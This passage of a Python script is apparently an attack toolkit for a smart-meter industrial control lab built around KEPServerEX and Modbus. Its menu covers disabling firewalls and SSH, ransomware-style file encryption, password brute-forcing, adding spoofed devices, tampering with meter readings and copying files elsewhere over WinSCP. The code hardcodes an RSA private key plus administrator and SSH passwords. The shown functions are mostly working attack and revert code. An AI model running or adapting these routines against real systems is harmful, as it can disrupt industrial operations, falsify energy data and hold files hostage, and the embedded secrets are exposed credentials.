            print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Inbound Firewall Not Removed (UDP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
        else:
            print("Outbound Firewall Not Removed (TCP/22)")
        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
        if "Ok." in cp.stdout.decode('utf-8'):
            count += 1
            print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
        else:
            print("Outbound Firewall Not Removed (UDP/22)")

        if count == 4:
            print("Revert Firewall Rules Success.")
        else:
            print("Revert Firewall Rules Fail.")

        # Start Kepserver service
        print("\n==================================\n")
            
        service_name = "KEPServerEXV6"
        cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
        output = cp.stdout.decode('utf-8').strip().split()
        if "FAILED" in cp.stdout.decode('utf-8'):
            print("FAILED: " + " ".join(output[4:]))
        else:
            print("The " + output[1] + " service is " + output[9])

        # Enable COM port
        print("\n==================================\n")
            
        cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
        dump = cp.stdout.split()
        deviceID = ""
        deviceArr = []
        for i in range(0, len(dump)):
            if dump[i].decode("utf-8") == "ID:":
                deviceID = dump[i+1].decode("utf-8")
                if "CVBCx196117" in deviceID:
                    comPort = deviceID
        batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
        with open("script.bat", "w") as f:
            f.write(batchscript)
        cp = run(["script.bat"],stdout=PIPE ,shell=True)
        print(cp.stdout.decode('utf-8'))
        remove("script.bat")

        # Decrypt Files
        print("\n==================================\n")

        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
    MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
    IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
    rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
    QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
    bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
    0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
    vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
    BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
    K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
    eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
    wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
    pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
    2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
    J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
    hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
    67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
    2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
    uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
    dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
    fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
    bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
    MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
    YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
    QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
    zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
    -----END RSA PRIVATE KEY-----'''
        
        excludeExtension = ['.py','.pem', '.exe']

        try:
            for item in recurseFiles(SMARTMETER_PATH): 
                filePath = Path(item)
                fileType = filePath.suffix.lower()

                if fileType in excludeExtension:
                    continue
                decrypt(filePath, privatekey)
            print("Decryption Successful")
        except Exception as e:
            print("Decryption Failed")

        # Remove copied file, directory, shared file and Scheduled Task
        print("\n==================================\n")
        
        for root, dirs, files in walk(COPIED_PATH):
            for file in files:
                og = path.join(root, file)
                remove(og)
                print("File: " + str(og) + " is deleted")


        if path.exists(COPIED_PATH):
            rmdir(COPIED_PATH)
            print(COPIED_PATH + " has beeen removed.")

        netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)

        if "SmartMeterfolder" in netsharechk.stdout:
            call('cmd /k "net share SmartMeterfolder /delete"', shell=True)

        task_name1 = 'Smart Meter Testing'
        task_name2 = 'Smart Meter Testing 2'

        schtaskschk = run(['schtasks', '/query', '/tn', '\"'+task_name1+'\"'], stdout=PIPE, stderr=PIPE, text=True)

        
        # Define the command to delete the task using schtasks
        schdel = f'schtasks /delete /tn "{task_name1}" /f'
        schdel2 = f'schtasks /delete /tn "{task_name2}" /f'

        # Delete the task using the schtasks command
        call(schdel, shell=True)
        call(schdel2, shell=True)

        print("\n==================================\n")

        print("Reverting successful.\nOk.\n")

    elif revertoption == "-h":
        print("\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder and Scheduled Task,\n9 Revert Everything.")
    else:
        print ("Invalid Option! Use option \"-h\" for help!")

def kep_connect(ip):
    # 172.16.2.77 if at lv 7
    # 172.16.2.223 if at lv 6
    server = connection.server(host = ip, port = 57412, user = 'Administrator', pw = 'administrator2022')
    print("Connected to KEP server.")
    return server

def kep_server_info(ip):
    server = kep_connect(ip)
    print(json.dumps(server.get_info(), indent=4),file=sys.stdout)

def kep_get_all_users():
    server = kep_connect("172.16.2.77")
    print(json.dumps(admin.users.get_all_users(server),indent=4),file=sys.stdout)

def kep_enable_user(user):
    server = kep_connect("172.16.2.77")
    print(admin.users.enable_user(server, user),file=sys.stdout)

def kep_disable_user(user):
    server = kep_connect("172.16.2.77")
    print(admin.users.disable_user(server, user),file=sys.stdout)

def kep_modify_user(user):
    server = kep_connect("172.16.2.77")
    print(admin.users.modify_user(server, user),file=sys.stdout)

def kep_get_single_user(user):
    server = kep_connect("172.16.2.77")
    print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)

def kep_get_all_channel(ip):
    server = kep_connect(ip)
    print(json.dumps(connectivity.channel.get_all_channels(server), indent=4))

def kep_get_all_device():
    server = kep_connect("172.16.2.77")
    print(json.dumps(connectivity.device.get_all_devices(server, "SmartMeter"), indent=4))

def kep_get_single_device():
    server = kep_connect("172.16.77")
    print(json.dumps(connectivity.device.get_device(server, "SmartMeter.ministicHACKED"), indent=4))

def kep_add_spoofed_device():
    server = kep_connect("172.16.2.77")
    print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, "SmartMeter", {"common.ALLTYPES_NAME": "Device69", "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial", "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
    print("\n" + json.dumps(connectivity.device.get_device(server, "SmartMeter.Device69"), indent=4))

def kep_delete_spoofed_device():
    server = kep_connect("172.16.2.77")
    print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, "SmartMeter.Device69"), indent=4))

def disable_running_schedules() -> None:
    cp = run(["schtasks", "/change", "/TN", "\MoveFiles", "/disable"], stdout=PIPE, check=False)
    output = cp.stdout.decode('utf-8').strip().split()
    if "SUCCESS:" in output:
        print("Successfully disabled \MoveFiles Tasks Scheduler", file=sys.stdout)
        print("Ok.")

    cp = run(["schtasks", "/change", "/TN", "\KEPServerEX 6.12", "/disable"], stdout=PIPE, check=False)
    output = cp.stdout.decode('utf-8').strip().split()
    if "SUCCESS:" in output:
        print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler", file=sys.stdout)
        print("Ok.")
    
def kep_server_stop():
    command_output = ssh_run_commands("sc query KEPServerEXV6")
    if "RUNNING" in command_output:
        print("Kepserver is running, Stopping now...")
        command_output = ssh_run_commands("sc stop KEPServerEXV6")
        
        while "STOP_PENDING" in command_output:
            command_output = ssh_run_commands("sc query KEPServerEXV6")
            if "FAILED" in command_output:
                print("FAILED:", "\nFail.\n") 
                return False
            elif "STOPPED" in command_output:
                print("Kepserver is stopped")
                return True
            else:
                print("Kepserver is still stopping... waiting 1 more second")
                sleep(1)
    elif "STOPPED" in command_output:
        print("Kepserver have already stopped")
        return True
    else:
        print("Something went wrong!")
        return False

def kep_server_start():
    command_output = ssh_run_commands("sc query KEPServerEXV6")
    if "STOPPED" in command_output:
        print("Kepserver is stopped, starting now...")
        command_output = ssh_run_commands("sc start KEPServerEXV6")

        while "START_PENDING" in command_output:
            command_output = ssh_run_commands("sc query KEPServerEXV6")
            if "FAILED" in command_output:
                print("FAILED:", "\nFail.\n")
                return False
            elif "RUNNING" in command_output:
                print("Kepserver is running!")
                return True
            else:
                print("Kepserver is still starting up... waiting 1 more second")
                sleep(1)
    elif "RUNNING" in command_output:
        print("Kepserver is running!")
        return True
    else:
        print("Something went wrong!")
        return False

def capturefilechangedatavalueandsendback():
    directory = r'C:\Users\Student\Documents\SmartMeterData\Meter2'
    os.chdir(directory)

    latest_file = max(os.listdir(directory), key=os.path.getctime)
    print(f"The most recently created file is {latest_file}")

    with open(latest_file, 'r+') as file:
        content = file.read()
        content = content.replace('False', 'True').replace('0', '1')
        file.seek(0)
        file.write(content)
        file.truncate()

def capturefileandsendtodiffdest():
    winscp_path = r'C:\Program Files (x86)\WinSCP\winscp.com'
    script_path = r'path\to\script.txt'

    command = [winscp_path, '/ini=nul', f'/script={script_path}']
    subprocess.run(command, shell=True)

#Getting status for GUI
def gui_get_kep_status():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("172.16.2.223", username="Student", password="Student12345@")
    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(r'powershell -command "Get-Service KEPServerEXV6 | Select-Object -Property Status"')
    for lines in ssh_stdout.readlines():
        if "Running" in lines:
                print("KEPSERVER Running")
                break

# TODO: kep_server_start()

########
# MAIN #
########

if __name__ == '__main__':
    attack_option = str(argv[1])
    
    # if attack_option != "1":
    #     check_admin()

    match attack_option:
        case "start": kep_server_start()
        case "stop":  kep_server_stop()
        case "1":  create_scheduled_task() 
        #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
        case "3":  disable_firewall()
        case "4":  disable_ssh()
        case "5":  kep_server_stop()
        case "6":  run_modinterrupt()
        case "7":  disable_COMPort()
        case "8":  encrypt_files()
        case "9":  change_meterID()
        case "10": clear_energy_reading()
        case "11": revert(revert_option := str(argv[2]))
        case "12": kep_bruteforce()
        case "13": baudrate_change()
        case "14": smartmeter_get_hardware_info()
        case "15": kep_server_info()
        case "16": kep_get_all_users()
        case "17": kep_enable_user("User1")
        case "18": kep_disable_user("User1")
        case "19": kep_get_single_user("User1")
        case "20": disable_running_schedules()
        case "21": kep_get_all_channel()
        case "22": kep_get_all_device()
        case "23": kep_get_single_device()
        case "24": kep_delete_spoofed_device()
        case "25": kep_add_spoofed_device()
        case "26": capturefilechangedatavalueandsendback()
        case "27": capturefileandsendtodiffdest()
        case "28": kep_modify_user()
        case "-h":
            print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
        case _: print("Invalid Option! Use option \"-h\" for help!")
